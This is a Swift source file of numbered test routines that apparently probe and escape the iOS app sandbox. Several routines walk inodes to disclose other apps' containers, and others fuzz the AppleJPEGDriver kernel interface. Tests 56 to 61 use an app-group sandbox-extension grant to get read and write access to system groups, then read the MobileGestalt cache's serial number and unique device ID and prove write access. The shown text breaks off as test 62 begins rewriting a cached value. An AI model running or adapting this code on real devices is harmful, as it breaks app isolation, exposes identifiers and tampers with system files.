        benchLine("     application containers visible: \(appFound.count)")
        for p in appFound.prefix(6) {
            benchLine("          \(p)")
        }

        benchLine(appFound.count > found.count
                  ? "[OK] fsgetpath discloses containers beyond our own"
                  : "[NO] only our own container is resolvable")
        benchLine("??? done")
    }

    // MARK: - test 50: read inside a disclosed container

    /// fsgetpath already disclosed 235 container paths. This checks whether any of
    /// them can actually be opened or listed, and repeats the walk with the
    /// /private prefix so the matching is exact.
    func bench50ContainerAccess() {
        benchLine("??? 50 ?? access inside disclosed containers")

        let appPrefix = "/private/var/mobile/Containers/Data/Application/"
        var st = statfs()
        guard statfs("/private/var/mobile/Containers/Data", &st) == 0 else {
            benchLine("[NO] statfs"); return
        }
        let fsid = st.f_fsid

        var buffer = [CChar](repeating: 0, count: 1024)
        var paths: [String] = []
        for inode in UInt64(1)...UInt64(400_000) {
            var fs = fsid
            let n = buffer.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buffer)
            if p.hasPrefix(appPrefix) {
                let rest = p.dropFirst(appPrefix.count)
                if !rest.contains("/") { paths.append(p) }
            }
        }
        benchLine("     containers disclosed: \(paths.count)")

        let mine = NSHomeDirectory().replacingOccurrences(of: "/var/", with: "/private/var/")
        var readable = 0, listed = 0, opened = 0
        var samples: [String] = []

        for p in paths where p != mine {
            // Can we even stat it?
            var sb = stat()
            if stat(p, &sb) == 0 { readable += 1 }

            // Can we list it?
            if let d = opendir(p) {
                var entries = 0
                while let e = readdir(d) { if e.pointee.d_name.0 != 46 { entries += 1 } }
                closedir(d)
                if entries > 0 {
                    listed += 1
                    if samples.count < 5 { samples.append("\(p) (\(entries) entries)") }
                }
            }

            // Can we open a file inside it?
            let meta = p + "/.com.apple.mobile_container_manager.metadata.plist"
            if let fh = FileHandle(forReadingAtPath: meta) {
                opened += 1
                let head = fh.readData(ofLength: 32)
                fh.closeFile()
                if samples.count < 7 { samples.append("read \(meta) ??? \(head.count) bytes") }
            }
        }

        benchLine("     statable: \(readable) ?? listable: \(listed) ?? file open: \(opened)")
        for s in samples.prefix(7) {
            benchLine("          \(s)")
        }
        benchLine(listed > 0 || opened > 0
                  ? "[OK] access crosses the container boundary"
                  : "[NO] paths are disclosed but contents are denied")
        benchLine("??? done")
    }

    // MARK: - test 51: JPEG driver selectors

    /// AppleJPEGDriver opened for every client type, so it accepts our requests.
    /// This maps its selectors with the calling shapes that worked elsewhere.
    func bench51JPEGSelectors() {
        benchLine("??? 51 ?? AppleJPEGDriver selectors")

        guard let m = "AppleJPEGDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870207: return "NotPrivileged"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        func call(_ sel: UInt32, size: Int, scalars: Int, outSize: Int = 0) -> kern_return_t {
            var input = [UInt8](repeating: 0, count: max(size, 1))
            var sc = [UInt64](repeating: 0, count: max(scalars, 1))
            var out = [UInt8](repeating: 0, count: max(outSize, 1))
            var outCnt = outSize
            var scount: UInt32 = 8
            var sOut = [UInt64](repeating: 0, count: 8)
            var kr: kern_return_t = -1
            input.withUnsafeBytes { ib in
                out.withUnsafeMutableBytes { ob in
                    sc.withUnsafeMutableBufferPointer { sb in
                        sOut.withUnsafeMutableBufferPointer { sop in
                            kr = xq_IOConnectCallMethod(conn, sel,
                                                        scalars > 0 ? sb.baseAddress : nil, UInt32(scalars),
                                                        size > 0 ? ib.baseAddress : nil, size,
                                                        sop.baseAddress, &scount,
                                                        outSize > 0 ? ob.baseAddress : nil, &outCnt)
                        }
                    }
                }
            }
            return kr
        }

        let sizes = [0, 0x8, 0x10, 0x18, 0x20, 0x40, 0x100]
        for sel in UInt32(0)...15 {
            var parts: [String] = []
            for size in sizes {
                let kr = call(sel, size: size, scalars: 0)
                if kr != -536870206 { parts.append("0x\(String(size, radix: 16))=\(name(kr))") }
            }
            if parts.isEmpty {
                benchLine("     sel \(sel): BadArgument for all sizes")
            } else {
                benchLine("     sel \(sel): \(parts.joined(separator: " "))")
            }
        }

        benchLine("     a selector that answers ok is a candidate entry point")
        benchLine("??? done")
    }

    // MARK: - test 52: JPEG driver size sweep

    /// Every coarse shape was rejected, so the accepted size is specific. This
    /// sweeps input sizes in 8-byte steps for the low selectors, with and without
    /// scalars and with a real output buffer, and reports anything that is not
    /// BadArgument.
    func bench52JPEGSweep() {
        benchLine("??? 52 ?? JPEG driver size sweep")

        guard let m = "AppleJPEGDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        var conn: io_connect_t = 0
        guard xq_IOServiceOpen(svc, mach_task_self_, 0, &conn) == KERN_SUCCESS else { return }
        defer { xq_IOServiceClose(conn) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870207: return "NotPrivileged"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        var accepted: [String] = []
        var other: [String] = []

        for sel in UInt32(0)...7 {
            for scalars in [0, 2] {
                var size = 8
                while size <= 0x400 {
                    var input = [UInt8](repeating: 0, count: size)
                    var sc = [UInt64](repeating: 0, count: 2)
                    var out = [UInt8](repeating: 0, count: 0x400)
                    var outCnt = 0x400
                    var scount: UInt32 = 8
                    var sOut = [UInt64](repeating: 0, count: 8)
                    var kr: kern_return_t = -1
                    input.withUnsafeBytes { ib in
                        out.withUnsafeMutableBytes { ob in
                            sc.withUnsafeMutableBufferPointer { sb in
                                sOut.withUnsafeMutableBufferPointer { sop in
                                    kr = xq_IOConnectCallMethod(conn, sel,
                                                                scalars > 0 ? sb.baseAddress : nil, UInt32(scalars),
                                                                ib.baseAddress, size,
                                                                sop.baseAddress, &scount,
                                                                ob.baseAddress, &outCnt)
                                }
                            }
                        }
                    }
                    if kr == 0 {
                        accepted.append("sel \(sel) sc\(scalars) size 0x\(String(size, radix: 16)) ??? ok out=\(outCnt)")
                    } else if kr != -536870206 && other.count < 20 {
                        other.append("sel \(sel) sc\(scalars) size 0x\(String(size, radix: 16)) ??? \(name(kr))")
                    }
                    size += 8
                }
            }
        }

        benchLine("     accepted: \(accepted.count)")
        for a in accepted.prefix(12) { benchLine("          \(a)") }
        benchLine("     other answers: \(other.count)")
        for o in other.prefix(12) { benchLine("          \(o)") }
        if accepted.isEmpty && other.isEmpty {
            benchLine("[NO] the driver rejects every size up to 0x400 on selectors 0-7")
        }
        benchLine("??? done")
    }

    // MARK: - test 53: JPEG driver wide size sweep

    /// The earlier sweep stopped at 0x400. The IO structs carry surface handles
    /// and geometry, so they can be larger. This walks 8-byte steps up to 0x2000
    /// on the low selectors, with and without scalars, and with a large output.
    func bench53JPEGWideSweep() {
        benchLine("??? 53 ?? JPEG driver wide size sweep")

        guard let m = "AppleJPEGDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870207: return "NotPrivileged"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        var found: [String] = []

        for type in UInt32(0)...1 {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, type, &conn) == KERN_SUCCESS else { continue }
            defer { xq_IOServiceClose(conn) }

            for sel in UInt32(0)...3 {
                for scalars in [0, 1, 2, 3] {
                    var size = 0x408
                    while size <= 0x2000 {
                        var input = [UInt8](repeating: 0, count: size)
                        var sc = [UInt64](repeating: 0, count: 3)
                        var out = [UInt8](repeating: 0, count: 0x2000)
                        var outCnt = 0x2000
                        var scount: UInt32 = 8
                        var sOut = [UInt64](repeating: 0, count: 8)
                        var kr: kern_return_t = -1
                        input.withUnsafeBytes { ib in
                            out.withUnsafeMutableBytes { ob in
                                sc.withUnsafeMutableBufferPointer { sb in
                                    sOut.withUnsafeMutableBufferPointer { sop in
                                        kr = xq_IOConnectCallMethod(conn, sel,
                                                                    scalars > 0 ? sb.baseAddress : nil, UInt32(scalars),
                                                                    ib.baseAddress, size,
                                                                    sop.baseAddress, &scount,
                                                                    ob.baseAddress, &outCnt)
                                    }
                                }
                            }
                        }
                        if kr != -536870206 {
                            found.append("type \(type) sel \(sel) sc\(scalars) size 0x\(String(size, radix: 16)) ??? \(name(kr))")
                        }
                        size += 8
                    }
                }
            }
        }

        benchLine("     answers other than BadArgument: \(found.count)")
        for f in found.prefix(20) { benchLine("          \(f)") }
        if found.isEmpty {
            benchLine("[NO] nothing up to 0x2000 either ??? the trigger needs a real port or surface")
        }
        benchLine("??? done")
    }

    // MARK: - test 54: JPEG with a notification port

    /// The decoder methods take a mach_port_t, so the client may refuse every call
    /// until a notification port is registered. This sets one on each client type
    /// and retries the common structure sizes.
    func bench54JPEGPort() {
        benchLine("??? 54 ?? JPEG driver with a notification port")

        guard let m = "AppleJPEGDriver".withCString({ xq_IOServiceMatching($0) }) else { return }
        var it: io_iterator_t = 0
        guard xq_IOServiceGetMatchingServices(0, m, &it) == KERN_SUCCESS else { return }
        let svc = xq_IOIteratorNext(it); xq_IOObjectRelease(it)
        guard svc != 0 else { return }
        defer { xq_IOObjectRelease(svc) }

        // A receive port to hand over.
        var port: mach_port_t = 0
        mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &port)
        benchLine("     port allocated: \(port)")
        defer { if port != 0 { mach_port_deallocate(mach_task_self_, port) } }

        func name(_ kr: kern_return_t) -> String {
            switch kr {
            case 0: return "ok"
            case -536870206: return "BadArgument"
            case -536870201: return "Unsupported"
            case -536870199: return "NotPermitted"
            case -536870207: return "NotPrivileged"
            case -536870160: return "NotReady"
            default: return "kr=\(kr)"
            }
        }

        var found: [String] = []

        for type in UInt32(0)...3 {
            var conn: io_connect_t = 0
            guard xq_IOServiceOpen(svc, mach_task_self_, type, &conn) == KERN_SUCCESS else { continue }
            defer { xq_IOServiceClose(conn) }

            let pk = xq_IOConnectSetNotificationPort(conn, 0, port, 0)
            benchLine("     type \(type) port=\(name(pk))")

            for sel in UInt32(0)...3 {
                for size in [0x8, 0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48, 0x50, 0x60, 0x80, 0xA0, 0xC0, 0x100] {
                    for scalars in [0, 2] {
                        var input = [UInt8](repeating: 0, count: size)
                        var sc = [UInt64](repeating: 0, count: 2)
                        var out = [UInt8](repeating: 0, count: 0x400)
                        var outCnt = 0x400
                        var scount: UInt32 = 8
                        var sOut = [UInt64](repeating: 0, count: 8)
                        var kr: kern_return_t = -1
                        input.withUnsafeBytes { ib in
                            out.withUnsafeMutableBytes { ob in
                                sc.withUnsafeMutableBufferPointer { sb in
                                    sOut.withUnsafeMutableBufferPointer { sop in
                                        kr = xq_IOConnectCallMethod(conn, sel,
                                                                    scalars > 0 ? sb.baseAddress : nil, UInt32(scalars),
                                                                    ib.baseAddress, size,
                                                                    sop.baseAddress, &scount,
                                                                    ob.baseAddress, &outCnt)
                                    }
                                }
                            }
                        }
                        if kr != -536870206 {
                            found.append("type \(type) sel \(sel) sc\(scalars) 0x\(String(size, radix: 16)) ??? \(name(kr))")
                        }
                    }
                }
            }
        }

        benchLine("     non-BadArgument answers: \(found.count)")
        for f in found.prefix(20) { benchLine("          \(f)") }
        if found.isEmpty {
            benchLine("[NO] a notification port does not change the answer")
        }
        benchLine("??? done")
    }

    // MARK: - test 55: the MobileGestalt cache

    /// The About screen reads its values from the MobileGestalt cache inside
    /// /var/containers/Shared/SystemGroup. This checks whether that path is
    /// reachable, whether the cache is visible, and whether it is writable.
    func bench55MobileGestalt() {
        benchLine("??? 55 ?? MobileGestalt cache reachability")

        let systemGroup = "/private/var/containers/Shared/SystemGroup"
        var st = statfs()
        guard statfs(systemGroup, &st) == 0 else {
            benchLine("[NO] statfs on \(systemGroup) failed")
            return
        }
        let fsid = st.f_fsid

        // Direct probes first: the plain paths a sandboxed app might reach.
        for path in ["/var/containers/Shared/SystemGroup",
                     "/private/var/containers/Shared/SystemGroup",
                     "/var/mobile/Library/Caches/com.apple.MobileGestalt.plist",
                     "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.MobileGestalt.plist"] {
            var sb = stat()
            let st1 = stat(path, &sb)
            var d: UnsafeMutablePointer<DIR>? = opendir(path)
            var entries = 0
            if let d {
                while let e = readdir(d) { if e.pointee.d_name.0 != 46 { entries += 1 } }
                closedir(d)
            }
            d = nil
            let readable = access(path, R_OK) == 0
            let writable = access(path, W_OK) == 0
            benchLine("     \(path)")
            benchLine("          stat=\(st1 == 0 ? "ok" : "\(errno)") ?? entries=\(entries) ?? R=\(readable) ?? W=\(writable)")
        }

        // Then the inode walk, looking for the cache by name.
        var buffer = [CChar](repeating: 0, count: 1024)
        var mgPaths: [String] = []
        var groupDirs: Set<String> = []
        let prefix = "/private/var/containers/Shared/SystemGroup/"
        for inode in UInt64(1)...UInt64(400_000) {
            var fs = fsid
            let n = buffer.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buffer)
            guard p.hasPrefix(prefix) else { continue }
            let rest = p.dropFirst(prefix.count)
            if let first = rest.split(separator: "/").first {
                groupDirs.insert(String(first))
            }
            if p.contains("MobileGestalt") { mgPaths.append(p) }
        }

        benchLine("     SystemGroup entries resolved: \(groupDirs.count)")
        for g in groupDirs.sorted().prefix(6) { benchLine("          \(g)") }
        benchLine("     paths mentioning MobileGestalt: \(mgPaths.count)")
        for p in mgPaths.prefix(6) {
            var sb = stat()
            let ok = stat(p, &sb) == 0
            let w = access(p, W_OK) == 0
            benchLine("          \(p) ?? stat=\(ok) ?? W=\(w)")
        }

        if mgPaths.isEmpty {
            benchLine("[NO] the cache is not reachable from this app")
        } else {
            benchLine("[?] the cache is visible ??? writing it is the next question")
        }
        benchLine("??? done")
    }

    // MARK: - test 56: app group and the extension path

    /// The published escape mints a sandbox extension for the group's
    /// Library/Caches path after replacing it with a symlink, so the grant lands
    /// on the target. This checks first whether a group container exists at all,
    /// then runs the sequence against a harmless target.
    func bench56AppGroupPath() {
        benchLine("??? 56 ?? app group and the extension path")

        let groups = ["group.b14c62c03230f578.1", "group.b14c62c03230f578.2",
                      "group.b14c62c03230f578.3", "group.b14c62c03230f578.4",
                      "group.b14c62c03230f578.5"]
        var usable: String?
        for g in groups {
            let ok = g.withCString { wq_group_available($0) } != 0
            benchLine("     \(g): \(ok ? "container available" : "nil")")
            if ok && usable == nil { usable = g }
        }

        guard let group = usable else {
            benchLine("[NO] no app group container ??? the sequence needs one")
            return
        }

        // Target: the directory that holds the shared system groups. Harmless to
        // read, and the interesting parent of the MobileGestalt cache.
        let targets = ["/var/containers/Shared/SystemGroup",
                       "/var/containers/Shared/SystemGroup/systemgroup.com.apple.MobileGestalt.plist"]
        for target in targets {
            let flags26: UInt64 = 0x0000_0008_0000_0000
            let flags27: UInt64 = 0x0000_0080_0000_0000
            for (label, flags) in [("26.x", flags26), ("27.x", flags27)] {
                let handle = target.withCString { t in
                    group.withCString { g in wq_grant(t, g, flags) }
                }
                var listed = 0
                if handle >= 0, let d = opendir(target) {
                    while let e = readdir(d) { if e.pointee.d_name.0 != 46 { listed += 1 } }
                    closedir(d)
                }
                let w = access(target, W_OK) == 0
                let r = access(target, R_OK) == 0
                benchLine("     \(label) ??? \(target)")
                benchLine("          handle=\(handle) ?? R=\(r) ?? W=\(w) ?? entries=\(listed)")
                if handle >= 0 { wq_revoke(handle) }
            }
        }

        benchLine("     a positive handle with R or W lifted is the escape")
        benchLine("??? done")
    }

    // MARK: - test 57: which targets accept the grant

    /// Test 56 reached the last step and got no token for a SystemGroup target.
    /// This tries a spread of existing paths, so we learn whether the grant works
    /// at all here and which part of the file system it opens.
    func bench57GrantTargets() {
        benchLine("??? 57 ?? which targets accept the grant")

        guard let group = firstUsableGroup() else {
            benchLine("[NO] no app group"); return
        }
        benchLine("     group: \(group)")

        // Candidate targets: existing paths outside our container.
        var candidates: [String] = [
            "/var/mobile/Library/Caches",
            "/var/mobile/Library/Preferences",
            "/var/mobile/Library",
            "/var/containers/Shared/SystemGroup",
            "/var/mobile/Containers/Data/Application",
        ]

        // Plus the Library/Caches of the first shared system groups, resolved by
        // inode, since those are the ones the technique is aimed at.
        var st = statfs()
        if statfs("/private/var/containers/Shared/SystemGroup", &st) == 0 {
            var buffer = [CChar](repeating: 0, count: 1024)
            var dirs: [String] = []
            let prefix = "/private/var/containers/Shared/SystemGroup/"
            for inode in UInt64(1)...UInt64(200_000) {
                var fs = st.f_fsid
                let n = buffer.withUnsafeMutableBufferPointer { bp -> Int in
                    withUnsafePointer(to: &fs) { fp in
                        xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                    }
                }
                if n <= 0 { continue }
                let p = String(cString: buffer)
                guard p.hasPrefix(prefix) else { continue }
                let rest = p.dropFirst(prefix.count)
                if let first = rest.split(separator: "/").first {
                    let dir = prefix + first
                    if !dirs.contains(dir) { dirs.append(dir) }
                }
            }
            benchLine("     shared system groups resolved: \(dirs.count)")
            for d in dirs.prefix(3) {
                candidates.append(d + "/Library/Caches")
                candidates.append(d)
            }
        }

        let flagsList: [(String, UInt64)] = [("26.x", 0x0000_0008_0000_0000),
                                             ("27.x", 0x0000_0080_0000_0000)]

        for target in candidates {
            var sb = stat()
            let exists = lstat(target, &sb) == 0
            guard exists else {
                benchLine("     \(target) ?? does not exist")
                continue
            }
            var line = "     \(target) ?? exists"
            for (label, flags) in flagsList {
                let handle = target.withCString { t in
                    group.withCString { g in wq_grant(t, g, flags) }
                }
                line += " ?? \(label):\(handle)"
                if handle >= 0 { wq_revoke(handle) }
            }
            let r = access(target, R_OK) == 0
            let w = access(target, W_OK) == 0
            benchLine(line + " ?? R=\(r) W=\(w)")
        }

        benchLine("     handle >= 0 on any target means the grant landed")
        benchLine("??? done")
    }

    private func firstUsableGroup() -> String? {
        for g in ["group.b14c62c03230f578.1", "group.b14c62c03230f578.2",
                  "group.b14c62c03230f578.3", "group.b14c62c03230f578.4",
                  "group.b14c62c03230f578.5"] {
            if g.withCString({ wq_group_available($0) }) != 0 { return g }
        }
        return nil
    }

    // MARK: - test 58: use the grant before releasing it

    /// Test 57 revoked each extension before checking access, so the R/W columns
    /// were meaningless. This keeps the handle alive while actually listing and
    /// reading through the granted path.
    func bench58GrantInUse() {
        benchLine("??? 58 ?? using the grant while it is alive")

        guard let group = firstUsableGroup() else {
            benchLine("[NO] no app group"); return
        }
        benchLine("     group: \(group)")

        // Collect shared system group directories by inode.
        var st = statfs()
        guard statfs("/private/var/containers/Shared/SystemGroup", &st) == 0 else {
            benchLine("[NO] statfs"); return
        }
        var buffer = [CChar](repeating: 0, count: 1024)
        var dirs: [String] = []
        let prefix = "/private/var/containers/Shared/SystemGroup/"
        for inode in UInt64(1)...UInt64(200_000) {
            var fs = st.f_fsid
            let n = buffer.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buffer)
            guard p.hasPrefix(prefix) else { continue }
            let rest = p.dropFirst(prefix.count)
            if let first = rest.split(separator: "/").first {
                let dir = prefix + first
                if !dirs.contains(dir) { dirs.append(dir) }
            }
        }
        benchLine("     shared system groups: \(dirs.count)")

        let flags: UInt64 = 0x0000_0080_0000_0000
        var opened = 0, readAny = 0
        var samples: [String] = []

        for dir in dirs.prefix(8) {
            let handle = dir.withCString { t in
                group.withCString { g in wq_grant(t, g, flags) }
            }
            guard handle >= 0 else {
                benchLine("     \(dir.split(separator: "/").last ?? "?") ?? grant \(handle)")
                continue
            }

            // Access checks while the extension is alive.
            let r = access(dir, R_OK) == 0
            let w = access(dir, W_OK) == 0
            var entries = 0
            var names: [String] = []
            if let d = opendir(dir) {
                while let e = readdir(d) {
                    let name = withUnsafeBytes(of: e.pointee.d_name) { raw -> String in
                        let bytes = raw.prefix { $0 != 0 }
                        return String(decoding: bytes, as: UTF8.self)
                    }
                    if name != "." && name != ".." {
                        entries += 1
                        if names.count < 3 { names.append(name) }
                    }
                }
                closedir(d)
            }
            if entries > 0 { opened += 1 }
            if r || w { readAny += 1 }

            let short = dir.split(separator: "/").last.map(String.init) ?? "?"
            benchLine("     \(short) ?? h=\(handle) R=\(r) W=\(w) entries=\(entries)")
            if !names.isEmpty {
                benchLine("          \(names.joined(separator: ", "))")
            }
            // Try reading a file inside, if one is listed.
            if let first = names.first {
                let path = dir + "/" + first
                if let fh = FileHandle(forReadingAtPath: path) {
                    let head = fh.readData(ofLength: 16)
                    fh.closeFile()
                    if samples.count < 4 {
                        samples.append("read \(first) ??? \(head.count) bytes")
                    }
                }
            }
            wq_revoke(handle)
        }

        benchLine("     directories listable while granted: \(opened) ?? access lifted: \(readAny)")
        for s in samples { benchLine("          \(s)") }
        benchLine(opened > 0 || readAny > 0
                  ? "[OK] the grant survives long enough to use"
                  : "[NO] the grant does not lift access")
        benchLine("??? done")
    }

    // MARK: - test 59: find the MobileGestalt cache inside the granted groups

    /// Test 58 reached eight shared system groups with read and write. This walks
    /// all of them by name, lists each Library/Caches through a fresh grant, and
    /// reports any file connected to MobileGestalt.
    func bench59FindGestalt() {
        benchLine("??? 59 ?? finding the MobileGestalt cache")

        guard let group = firstUsableGroup() else {
            benchLine("[NO] no app group"); return
        }

        var st = statfs()
        guard statfs("/private/var/containers/Shared/SystemGroup", &st) == 0 else { return }
        var buffer = [CChar](repeating: 0, count: 1024)
        var dirs: [String] = []
        let prefix = "/private/var/containers/Shared/SystemGroup/"
        for inode in UInt64(1)...UInt64(200_000) {
            var fs = st.f_fsid
            let n = buffer.withUnsafeMutableBufferPointer { bp -> Int in
                withUnsafePointer(to: &fs) { fp in
                    xq_fsgetpath(bp.baseAddress, bp.count, fp, inode)
                }
            }
            if n <= 0 { continue }
            let p = String(cString: buffer)
            guard p.hasPrefix(prefix) else { continue }
            let rest = p.dropFirst(prefix.count)
            if let first = rest.split(separator: "/").first {
                let dir = prefix + first
                if !dirs.contains(dir) { dirs.append(dir) }
            }
        }
        benchLine("     shared system groups: \(dirs.count)")
        let names = dirs.map { String($0.split(separator: "/").last ?? "") }
        benchLine("     names: \(names.joined(separator: ", "))")

        let flags: UInt64 = 0x0000_0080_0000_0000
        var found: [String] = []

        func list(_ path: String, depth: Int, label: String) {
            let handle = path.withCString { t in
                group.withCString { g in wq_grant(t, g, flags) }
            }
            guard handle >= 0 else {
                if label.isEmpty { benchLine("     \(path) ?? grant \(handle)") }
                return
            }
            defer { wq_revoke(handle) }

            guard let d = opendir(path) else {
                benchLine("     \(path) ?? opendir failed")
                return
            }
            var entries: [String] = []
            while let e = readdir(d) {
                let name = withUnsafeBytes(of: e.pointee.d_name) { raw -> String in
                    String(decoding: raw.prefix { $0 != 0 }, as: UTF8.self)
                }
                if name != "." && name != ".." { entries.append(name) }
            }
            closedir(d)

            let short = path.replacingOccurrences(of: prefix, with: "")
            benchLine("     \(short) ?? \(entries.count) entries: \(entries.prefix(6).joined(separator: ", "))")

            for name in entries {
                if name.localizedCaseInsensitiveContains("gestalt") {
                    found.append(path + "/" + name)
                }
            }

            // One level deeper for Library and Caches.
            if depth < 2 {
                for sub in entries where sub == "Library" || sub == "Caches" {
                    list(path + "/" + sub, depth: depth + 1, label: "sub")
                }
            }
        }

        for dir in dirs {
            list(dir, depth: 0, label: "")
        }

        benchLine("     MobileGestalt candidates: \(found.count)")
        for f in found.prefix(6) {
            var sb = stat()
            let ok = stat(f, &sb) == 0
            benchLine("          \(f) ?? exists=\(ok)" + (ok ? " size=\(sb.st_size)" : ""))
        }
        benchLine(found.isEmpty
                  ? "[NO] nothing named MobileGestalt in the granted groups"
                  : "[OK] the cache is reachable ??? that is the About screen")
        benchLine("??? done")
    }

    // MARK: - test 60: read the gestalt cache and prove it is writable

    /// Test 59 located the cache. This reads every key it carries, reports the
    /// ones the About screen uses, and proves write access by writing the same
    /// bytes back ??? no value is changed here.
    func bench60GestaltRead() {
        benchLine("??? 60 ?? reading the gestalt cache")

        let path = "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches/com.apple.MobileGestalt.plist"
        let parent = "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches"

        guard let group = firstUsableGroup() else {
            benchLine("[NO] no app group"); return
        }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in
            group.withCString { g in wq_grant(t, g, flags) }
        }
        benchLine("     grant on Caches: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        var sb = stat()
        guard stat(path, &sb) == 0 else {
            benchLine("[NO] stat failed errno=\(errno)"); return
        }
        benchLine("     size: \(sb.st_size) bytes ?? mode 0\(String(sb.st_mode & 0o777, radix: 8))")

        guard let data = FileManager.default.contents(atPath: path) else {
            benchLine("[NO] read failed errno=\(errno)"); return
        }
        benchLine("     read: \(data.count) bytes")
        benchLine("     magic: \(String(data.prefix(8).map { String(format: "%02x", $0) }.joined(separator: " ")))")

        // Parse as a plist.
        if let plist = try? PropertyListSerialization.propertyList(from: data, format: nil),
           let dict = plist as? [String: Any] {
            benchLine("     top-level keys: \(dict.count)")
            let wanted = ["UserAssignedDeviceName", "DeviceName", "ModelNumber",
                          "SerialNumber", "ProductType", "ProductName",
                          "RegulatoryModelNumber", "UniqueDeviceID", "BuildVersion"]
            for key in wanted {
                if let v = dict[key] {
                    benchLine("          \(key) = \(v)")
                }
            }
            let sample = dict.keys.sorted().prefix(12)
            benchLine("     first keys: \(sample.joined(separator: ", "))")
        } else {
            benchLine("     not a plist dict ??? raw container")
        }

        // Prove write access without changing anything: rewrite identical bytes.
        var writable = false
        if let fh = FileHandle(forWritingAtPath: path) {
            fh.seek(toFileOffset: 0)
            fh.write(data)
            fh.synchronizeFile()
            fh.closeFile()
            writable = true
        }
        let after = FileManager.default.contents(atPath: path)
        benchLine("     rewrite identical bytes: \(writable ? "ok" : "denied") ?? size after \(after?.count ?? -1)")

        // And a rename probe inside the same directory, then undo it.
        let probe = parent + "/.bench27-write-probe"
        let created = FileManager.default.createFile(atPath: probe, contents: Data("probe".utf8))
        if created { try? FileManager.default.removeItem(atPath: probe) }
        benchLine("     file create in Caches: \(created)")

        benchLine(writable || created
                  ? "[OK] the cache directory is writable from the sandbox"
                  : "[NO] read only")
        benchLine("??? done")
    }

    // MARK: - test 61: read the nested gestalt values and keep a backup

    /// The cache stores its values under CacheExtra. This prints the ones the
    /// About screen uses and copies the whole file into our own container, so any
    /// later experiment can be undone.
    func bench61GestaltValues() {
        benchLine("??? 61 ?? gestalt values and backup")

        let path = benchGestaltPath
        let parent = (path as NSString).deletingLastPathComponent
        guard let group = firstUsableGroup() else { benchLine("[NO] no group"); return }
        let flags: UInt64 = 0x0000_0080_0000_0000
        let handle = parent.withCString { t in group.withCString { g in wq_grant(t, g, flags) } }
        benchLine("     grant: \(handle)")
        guard handle >= 0 else { return }
        defer { wq_revoke(handle) }

        guard let data = FileManager.default.contents(atPath: path),
              let plist = try? PropertyListSerialization.propertyList(from: data, format: nil),
              let root = plist as? [String: Any] else {
            benchLine("[NO] cannot parse the cache"); return
        }

        if let extra = root["CacheExtra"] as? [String: Any] {
            benchLine("     CacheExtra keys: \(extra.count)")
            let wanted = ["UserAssignedDeviceName", "ModelNumber", "SerialNumber",
                          "ProductType", "ProductName", "RegulatoryModelNumber",
                          "HWModel", "DeviceName", "RegionCode", "UniqueDeviceID"]
            for key in wanted {
                if let v = extra[key] {
                    benchLine("          \(key) = \(v)")
                }
            }
        }
        if let uuid = root["CacheUUID"] { benchLine("     CacheUUID = \(uuid)") }
        if let ver = root["CacheVersion"] { benchLine("     CacheVersion = \(ver)") }

        // Keep a copy in our own container.
        let docs = NSHomeDirectory() + "/Documents"
        try? FileManager.default.createDirectory(atPath: docs, withIntermediateDirectories: true)
        let backup = docs + "/mg-cache-backup.plist"
        do {
            try data.write(to: URL(fileURLWithPath: backup))
            benchLine("     backup written: \(backup) (\(data.count) bytes)")
        } catch {
            benchLine("     backup failed: \(error.localizedDescription)")
        }
        benchLine("??? done")
    }

    // MARK: - test 62: rewrite one value in the cache

    /// Sets UserAssignedDeviceName in the cache and writes the file back. The
    /// change is visible in the About screen after Settings reloads.
    func bench62GestaltWrite() {
